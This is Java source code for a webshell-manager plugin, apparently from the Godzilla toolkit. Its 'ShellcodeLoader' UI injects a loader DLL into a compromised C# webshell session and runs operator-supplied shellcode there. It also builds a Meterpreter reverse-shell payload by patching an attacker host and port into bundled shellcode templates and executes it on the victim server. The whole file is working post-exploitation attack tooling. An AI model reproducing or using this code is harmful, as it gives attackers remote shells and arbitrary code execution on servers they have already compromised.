package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.*;
import java.io.InputStream;

@PluginnAnnotation(
        payloadName = "CShapDynamicPayload",
        Name = "ShellcodeLoader"
)
public class ShellcodeLoader implements Plugin {
    private static final String CLASS_NAME = "ShellcodeLoader.Run";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton loadButton = new JButton("Load");
    private final JButton runButton = new JButton("Run");
    private final JSplitPane splitPane = new JSplitPane();
    private final JSplitPane meterpreterSplitPane = new JSplitPane();
    private final RTextArea shellcodeTextArea = new RTextArea();
    private final JPanel shellcodeLoaderPanel = new JPanel(new BorderLayout());
    private final JPanel meterpreterPanel = new JPanel(new BorderLayout());
    private final JTabbedPane tabbedPane = new JTabbedPane();
    private final RTextArea tipTextArea = new RTextArea();
    private final JButton goButton = new JButton("Go");
    private final JLabel hostLabel = new JLabel("host :");
    private final JLabel portLabel = new JLabel("port :");
    private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private final JTextField portTextField = new JTextField("4444", 7);
    private final JCheckBox is64CheckBox = new JCheckBox("is64", true);
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public ShellcodeLoader() {
        this.splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.splitPane.setDividerSize(0);
        this.meterpreterSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.shellcodeTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                ShellcodeLoader.this.splitPane.setDividerLocation(0.15D);
            }
        });
        this.is64CheckBox.addItemListener(e -> ShellcodeLoader.this.updateMeterpreterTip());
        this.shellcodeTextArea.setAutoscrolls(true);
        this.shellcodeTextArea.setBorder(new TitledBorder("shellcode"));
        this.shellcodeTextArea.setText("");
        this.tipTextArea.setAutoscrolls(true);
        this.tipTextArea.setBorder(new TitledBorder("tip"));
        this.tipTextArea.setText("");
        this.shellcodeLoaderPanel.add(this.splitPane);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.is64CheckBox);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.meterpreterPanel.add(this.meterpreterSplitPane);
        this.tabbedPane.addTab("shellcodeLoader", this.shellcodeLoaderPanel);
        this.tabbedPane.addTab("meterpreter", this.meterpreterPanel);
        this.updateMeterpreterTip();
        this.panel.add(this.tabbedPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/ShellcodeLoader.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("ShellcodeLoader.Run", data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", JOptionPane.INFORMATION_MESSAGE);
                } else {
                    JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", JOptionPane.WARNING_MESSAGE);
                }
            } catch (Exception var4) {
                Log.error(var4);
                JOptionPane.showMessageDialog(this.panel, var4.getMessage(), "提示", JOptionPane.WARNING_MESSAGE);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", JOptionPane.INFORMATION_MESSAGE);
        }

    }

    private void runButtonClick(ActionEvent actionEvent) {
        String shellcodeHex = this.shellcodeTextArea.getText().trim();
        if (shellcodeHex.length() > 0) {
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHex);
            byte[] result = this.payload.evalFunc("ShellcodeLoader.Run", "run", reqParameter);
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", JOptionPane.INFORMATION_MESSAGE);
        }

    }

    private void goButtonClick(ActionEvent actionEvent) {
        try {
            String host = this.hostTextField.getText().trim();
            int port = Integer.parseInt(this.portTextField.getText());
            boolean is64 = this.is64CheckBox.isSelected();
            String shellcodeHexString = this.getMeterpreterShellcodeHex(host, port, is64);
            ReqParameter reqParameter = new ReqParameter();
            reqParameter.add("shellcodeHex", shellcodeHexString);
            byte[] result = this.payload.evalFunc("ShellcodeLoader.Run", "run", reqParameter);
            String resultString = this.encoding.Decoding(result);
            Log.log(resultString);
            JOptionPane.showMessageDialog(this.panel, resultString, "提示", JOptionPane.INFORMATION_MESSAGE);
        } catch (Exception var9) {
            JOptionPane.showMessageDialog(this.panel, var9.getMessage(), "提示", JOptionPane.WARNING_MESSAGE);
        }

    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    public JPanel getView() {
        return this.panel;
    }

    public String getMeterpreterShellcodeHex(String host, int port, boolean is64) {
        String shellcodeHex = "";

        try {
            InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/reverse%s.bin", is64 ? "64" : ""));
            shellcodeHex = new String(functions.readInputStream(inputStream));
            inputStream.close();
            shellcodeHex = shellcodeHex.replace("{host}", functions.byteArrayToHex(functions.ipToByteArray(host)));
            shellcodeHex = shellcodeHex.replace("{port}", functions.byteArrayToHex(functions.shortToByteArray((short) port)));
        } catch (Exception var6) {
            Log.error(var6);
        }

        return shellcodeHex;
    }

    private void updateMeterpreterTip() {
        try {
            boolean is64 = this.is64CheckBox.isSelected();
            InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreterTip.txt");
            String tipString = new String(functions.readInputStream(inputStream));
            inputStream.close();
            tipString = tipString.replace("{arch}", is64 ? "/x64" : "");
            this.tipTextArea.setText(tipString);
        } catch (Exception var4) {
            Log.error(var4);
        }

    }
}
